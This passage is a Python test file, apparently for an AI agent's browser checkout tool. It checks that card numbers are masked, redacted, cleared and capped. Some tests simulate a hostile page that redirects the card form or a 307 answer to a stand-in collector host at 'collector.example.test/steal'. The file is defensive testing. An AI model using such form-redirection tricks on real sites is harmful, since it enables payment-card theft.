    assert lost[0]["error_type"] == "RuntimeError" and "crawler.sqlite" not in repr(logs)
    assert [r.action for r in await audit_rows(s)] == ["purchase_requested", "purchase_approved"]
    assert await s.ledger.spent_last_24h(s.user_id) == Decimal("23.40")
    # The next checkout is judged against it: $23.40 more is over a $40 day.
    s.settings.caps = (Decimal("25"), Decimal("40"))
    assert (await begin(s))["rule"] == "over_daily_cap"


# ── after the fill: what the page, the model and the channels can see ─────

SPACED = " ".join(TEST_NUMBER[i : i + 4] for i in range(0, 16, 4))  # 4242 4242 4242 4242
DASHED = "-".join(TEST_NUMBER[i : i + 4] for i in range(0, 16, 4))


def region_mean(data_url: str, box: dict) -> float:
    """Mean luminance of the inner part of *box* (CSS px == image px at
    DPR 1) in the JPEG *data_url*. A mask paints the box solid black, so
    a masked field reads near 0; a white input with text well over 100."""
    from PIL import Image

    raw = base64.b64decode(data_url.partition(",")[2])
    image = Image.open(io.BytesIO(raw)).convert("L")
    x0, y0 = int(box["x"]) + 3, int(box["y"]) + 3
    x1, y1 = int(box["x"] + box["width"]) - 3, int(box["y"] + box["height"]) - 3
    pixels = list(image.crop((x0, y0, x1, y1)).getdata())
    return sum(pixels) / max(1, len(pixels))


def kits(s):
    """A browser.read and a browser.act toolkit on the shop's session,
    sharing one page memory, the way the runtime wires them."""
    memory = PageMemory()
    read = BrowserReadToolkit(s.sessions, guard=s.guard, handoff=handoff, page_memory=memory)
    act = BrowserActToolkit(
        s.sessions, guard=s.guard, handoff=handoff, memory=memory, cancel_flag=lambda u: False
    )
    return read, act


def ref_of(outline: dict, prefix: str) -> str:
    for line in outline["outline"]:
        if line.lstrip().startswith(prefix):
            match = re.search(r"\[ref=((?:f\d+)?e\d+)\]", line)
            if match:
                return match.group(1)
    raise AssertionError(f"no {prefix!r} in {outline['outline']}")


@pytest.mark.asyncio
async def test_a_submit_the_page_stops_leaves_no_card_on_screen_or_in_the_picture(shop):
    """Client-side validation keeps the form on screen after "Place
    order": every card field (found by label, not by autocomplete) is
    cleared before the result's picture is taken, and that picture masks
    the fields by ref and by the shared classifier."""
    s = shop
    arguments = await begin(s, "/checkout-hint")
    assert CARD_KEY in arguments, arguments
    boxes = {sel: await s.page.locator(sel).bounding_box() for sel in ("#ccnum", "#csc", "#expdate")}
    before = s.toolkit.approval_image(arguments, user_id=s.user_id)
    assert all(region_mean(before, box) < 40 for box in boxes.values())
    result = await run(s, arguments)
    assert result["ok"] is False and result.get("filled") is True, result
    assert "no confirmation" in result["error"] and "could not clear" not in result["error"]
    assert s.posted == []
    for sel in ("#ccnum", "#csc", "#expdate"):
        assert await s.page.locator(sel).input_value() == "", sel
    for sel, box in boxes.items():
        assert region_mean(result["user_image"], box) < 40, sel
    # Every card value, as digits and as the page grouped them, is on the
    # redaction list for the rest of the task; the name is not.
    assert {TEST_NUMBER, SPACED, DASHED, TEST_CVC, "12/28", "12/2028", "1228"} <= set(s.session.typed_secrets)
    assert TEST_NAME not in s.session.typed_secrets
    assert_no_card_data(json.dumps({k: v for k, v in result.items() if k != "user_image"}))


@pytest.mark.asyncio
async def test_the_model_never_sees_the_card_after_a_stopped_submit(shop):
    """After the checkout returned filled=True, the model does what the
    error says and looks again: the outline, the find results, the page
    text and the screenshot for the model show no card value, even from
    a page that puts the grouped number back into the fields."""
    from services.agent.runtime import redact_binary_for_model

    s = shop
    result = await run(s, await begin(s, "/checkout-hint"))
    assert result.get("filled") is True, result
    # A page script that restores the card from its own memory: the
    # outline still hides it, by the classifier and by the redaction list.
    await s.page.evaluate(
        "([n, e, c]) => { ccnum.value = n; expdate.value = e; csc.value = c; }", [SPACED, "12/28", TEST_CVC]
    )
    read, _act = kits(s)
    boxes = {sel: await s.page.locator(sel).bounding_box() for sel in ("#ccnum", "#csc")}
    seen = []
    for action, params in (("snapshot", {}), ("find", {"text": "card"}), ("text", {}), ("screenshot", {"for_model": True})):
        out = await read.execute(action, params, user_id=s.user_id, task_id="t1")
        assert out["ok"] is True, out
        if action == "screenshot":
            assert all(region_mean(out["user_image"], box) < 40 for box in boxes.values())
        seen.append(json.dumps(redact_binary_for_model(out), ensure_ascii=False))
    for text in seen:
        assert SPACED not in text and TEST_NUMBER not in text and DASHED not in text
        assert re.search(r"(?<![0-9a-f])" + TEST_CVC + r"(?![0-9a-f])", text) is None
        assert "12/28" not in text


@pytest.mark.asyncio
async def test_a_confirmation_that_echoes_the_card_in_any_form_is_redacted(shop):
    """The grouped number, the dashed number, the security code and the
    expiry, as a confirmation page might print them: gone from the
    summary the model reads and from what the audit row would keep."""
    from services.agent.runtime import AgentRuntime

    s = shop
    original = PAGES["/order-confirmed"]
    PAGES["/order-confirmed"] = html(
        "Confirmed",
        f"<h1>Thank you</h1><p>Order number 77. Charged card {SPACED} ({DASHED}), security code "
        f"{TEST_CVC}, expires 12/2028, ends 4242.</p>",
    )
    try:
        result = await run(s, await begin(s))
    finally:
        PAGES["/order-confirmed"] = original
    assert result["ok"] is True, result
    summary = result["confirmation_text_summary"]
    assert "Order number 77" in summary and "ends 4242" in summary
    for leak in (SPACED, DASHED, TEST_NUMBER, "12/2028", f"code {TEST_CVC}"):
        assert leak not in summary and leak not in AgentRuntime._summarize_result(result)


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "field",
    ['<input name="cc-number" autocomplete="cc-number" readonly>', '<input name="pan" readonly>'],
)
async def test_a_fill_that_fails_logs_the_error_type_and_never_the_card(shop, field):
    """Playwright's call log quotes the value a fill was given; while the
    card is in play only the exception's type reaches the log."""
    from structlog.testing import capture_logs

    s = shop
    page = PAGES["/checkout"].replace('<input name="cc-number" autocomplete="cc-number">', field)
    assert "readonly" in page
    PAGES["/checkout-ro"] = page
    try:
        arguments = await begin(s, "/checkout-ro")
        assert CARD_KEY in arguments, arguments
        with capture_logs() as logs:
            result = await run(s, arguments)
    finally:
        del PAGES["/checkout-ro"]
    assert result["ok"] is False and "nothing was paid" in result["error"]
    failed = [entry for entry in logs if entry.get("event") == "checkout_pay_failed"]
    assert failed and failed[0]["error_type"] == "TimeoutError" and "error" not in failed[0]
    assert TEST_NUMBER[:7] not in repr(logs) and TEST_CVC not in repr(logs)
    assert s.posted == []


@pytest.mark.asyncio
@pytest.mark.parametrize("path, rule", [("/checkout-offscreen", "over_cap"), ("/checkout-note", "ambiguous_total")])
async def test_text_the_owner_cannot_see_or_a_second_total_cannot_set_the_amount(shop, path, rule):
    """Off-screen text is not a total at all (the real $99.00 stands and
    is over the cap); a visible second total after the form makes the
    page ambiguous, and an ambiguous page is refused, never charged."""
    s = shop
    result = await begin(s, path)
    assert result["rule"] == rule, result
    if rule == "ambiguous_total":
        assert "$99.00" in result["error"] and "$1.00" in result["error"]
    assert s.posted == [] and s.vault.opened == []


@pytest.mark.asyncio
async def test_the_daily_cap_counts_a_submit_without_a_recognised_confirmation(shop):
    """Per-day cap $50, three $23.40 checkouts on a merchant whose
    thank-you page uses none of the words the toolkit knows: the card
    went out twice, so the third is refused before the card exists."""
    s = shop
    original = PAGES["/order-confirmed"]
    PAGES["/order-confirmed"] = html("All set", "<h1>All set!</h1><p>Your tickets are on the way.</p>")
    outcomes = []
    try:
        for _ in range(3):
            arguments = await begin(s)
            if CARD_KEY not in arguments:
                outcomes.append(arguments["rule"])
                break
            outcomes.append((await run(s, arguments)).get("error", "ok")[:22])
    finally:
        PAGES["/order-confirmed"] = original
    assert outcomes == ["The order was sent but", "The order was sent but", "over_daily_cap"]
    assert len([p for p, _b in s.posted if p == "/pay"]) == 2
    assert await s.ledger.spent_last_24h(s.user_id) == Decimal("46.80")


@pytest.mark.asyncio
async def test_an_order_form_that_posts_to_http_is_refused_before_the_card(shop):
    s = shop
    result = await begin(s, "/checkout-mixed")
    assert result["rule"] == "submit_target" and "over http" in result["error"], result
    assert "shop.example.test/pay" in result["error"]
    assert s.posted == [] and s.vault.opened == []


@pytest.mark.asyncio
async def test_a_button_attached_through_form_cannot_send_the_card_elsewhere(shop):
    """A button an item line attaches to the card form with form= and
    points elsewhere with formaction= is never the order button: the
    card binds to the form's own target and the card goes there only."""
    s = shop
    arguments = await begin(s, "/checkout-formaction")
    assert CARD_KEY in arguments, arguments
    assert arguments[CARD_KEY]["submit_to"] == f"{ORIGIN}/pay"
    result = await run(s, arguments)
    assert result["ok"] is True, result
    assert [p for p, _b in s.posted] == ["/pay"]
    assert s.page.url == f"{ORIGIN}/pay"
    # The write window was open for that one POST, bound to this origin,
    # and closed again after.
    assert s.windows == [(True, ORIGIN)]
    assert s.guard.state.write_allowed is False and s.guard.state.write_origin is None


@pytest.mark.asyncio
async def test_a_form_whose_target_changes_after_the_card_is_refused_on_approve(shop):
    """The submit target is bound into the card; a page that rewrites its
    form's action after approval is a changed page."""
    s = shop
    arguments = await begin(s)
    await s.page.evaluate("document.querySelector('form').action = 'https://collector.example.test/steal'")
    result = await run(s, arguments)
    assert result["rule"] == "screen_changed" and s.posted == [] and s.vault.opened == []


@pytest.mark.asyncio
async def test_the_name_on_the_card_is_not_treated_as_a_secret(shop, monkeypatch):
    """``_card_secrets`` says the name is never redacted: it is the
    delivery name on the confirmation. Reading the filled fields back
    must not put it on the list either, or every later page would hide
    the person's own name from the model."""
    s = shop
    monkeypatch.setitem(
        PAGES,
        "/order-confirmed",
        html("Confirmed", f"<h1>Thank you {TEST_NAME}</h1><p>Order number 77 ships to {TEST_NAME}, 1 Main St.</p>"),
    )
    result = await run(s, await begin(s))
    assert result["ok"] is True, result
    assert TEST_NAME not in s.session.typed_secrets
    assert f"ships to {TEST_NAME}, 1 Main St." in result["confirmation_text_summary"]


@pytest.mark.asyncio
async def test_an_expiry_year_chosen_from_a_select_is_not_redacted_from_page_text(shop, monkeypatch):
    """/checkout-selects picks the year from a dropdown. A value read back
    from a select is not a typed secret: "2028" on the list would blank an
    order number and a copyright line on every page after."""
    s = shop
    monkeypatch.setitem(
        PAGES,
        "/order-confirmed",
        html("Confirmed", "<h1>Thank you</h1><p>Order number 2028-77.</p><p>© 2028 Fake Shop</p>"),
    )
    result = await run(s, await begin(s, "/checkout-selects"))
    assert result["ok"] is True, result
    assert "2028" not in s.session.typed_secrets and "12" not in s.session.typed_secrets
    assert "Order number 2028-77" in result["confirmation_text_summary"]
    assert {TEST_NUMBER, TEST_CVC, "12/28", "12/2028"} <= set(s.session.typed_secrets)


@pytest.mark.parametrize(
    "url, blocked, reason, starts",
    [
        ("https://shop.example.test/checkout", [], None, None),
        (
            "https://shop.example.test/checkout",
            [{"url": "https://collector.example.test/steal", "reason": "the order form tried to send its data from a frame to https://collector.example.test by POST, not by POST to https://shop.example.test"}],
            "submit_blocked",
            "The order could not be sent: https://collector.example.test/steal: the order form tried",
        ),
        (
            "chrome-error://chromewebdata/",
            [{"url": "https://collector.example.test/confirm", "via": "https://shop.example.test/pay", "reason": "the site's answer to the order pointed the same POST at https://collector.example.test (a 307 sends the card again), not by POST to https://shop.example.test"}],
            "submit_blocked",
            "The order was sent, but the site's answer led to https://collector.example.test/confirm, which Crawler stopped (",
        ),
        (
            "chrome-error://chromewebdata/",
            [],
            "no_confirmation",
            "The order was sent but the page after it could not be loaded, so the purchase may or may not have gone through.",
        ),
    ],
)
def test_what_a_stopped_submit_is_filed_as_and_told_as(url, blocked, reason, starts):
    """Three outcomes the guard's record tells apart: the order POST itself
    stopped (nothing left), the answer to a sent order stopped (the card
    reached the merchant), and an error page with nothing stopped (the
    order was sent; the page after it never loaded). Never "blocked by the
    network policy" when the guard blocked nothing."""
    outcome = BrowserCheckoutToolkit._blocked_submit(SimpleNamespace(url=url), blocked)
    if reason is None:
        assert outcome is None
        return
    assert outcome is not None and outcome[0] == reason
    assert outcome[1].startswith(starts), outcome[1]
    assert "check the site" in outcome[1] or reason == "submit_blocked" and "could not be sent" in outcome[1]


@pytest.mark.asyncio
async def test_a_stopped_checkout_cannot_be_finished_through_browser_act(shop):
    """After a validation stop, the model's natural next steps are a ZIP
    fill and a click on "Place order" through browser.act. The card is
    no longer in the form, and the click is refused as the checkout's
    job, whatever the purchases switch says."""
    s = shop
    result = await run(s, await begin(s, "/checkout-zip"))
    assert result.get("filled") is True and s.posted == [], (result, s.posted)
    assert await s.page.locator("input[name=cc-number]").input_value() == ""
    read, act = kits(s)
    outline = await read.execute("snapshot", {}, user_id=s.user_id, task_id="t1")
    call = {"action": "fill", "ref": ref_of(outline, '- textbox "ZIP"'), "text": "10001"}
    assert act.precheck(call, user_id=s.user_id) is None
    card = act.bind(call, user_id=s.user_id)
    done = await act.execute("fill", {k: v for k, v in card.items() if k != "action"}, user_id=s.user_id, task_id="t1", approved=True)
    assert done["ok"] is True
    outline = await read.execute("snapshot", {}, user_id=s.user_id, task_id="t1")
    click = {"action": "click", "ref": ref_of(outline, '- button "Place order"')}
    refusal = act.precheck(click, user_id=s.user_id)
    assert refusal is not None and refusal["rule"] == "use_checkout"
    assert refusal["error"] == "Crawler only pays through its own checkout step, which needs 'Buy things for me' on in Permissions."
    # And at run time, should a card somehow have been made.
    card = act.bind(click, user_id=s.user_id)
    result = await act.execute("click", {k: v for k, v in card.items() if k != "action"}, user_id=s.user_id, task_id="t1", approved=True)
    assert result["rule"] == "use_checkout" and s.posted == []


@pytest.mark.asyncio
async def test_a_cancel_between_the_fill_and_the_submit_clears_the_card(shop):
    s = shop
    arguments = await begin(s)
    calls = 0

    def cancel_after_the_fill(uid):
        nonlocal calls
        calls += 1
        return calls >= 3  # begin/run checks pass; the check after the fill says stop

    s.toolkit._cancel_flag = cancel_after_the_fill
    result = await run(s, arguments)
    assert result["rule"] == "cancelled" and result.get("filled") is True and s.posted == []
    for field in ("cc-number", "cc-csc", "cc-exp"):
        assert await s.page.locator(f"input[name={field}]").input_value() == "", field
    assert TEST_NUMBER in s.session.typed_secrets and TEST_CVC in s.session.typed_secrets
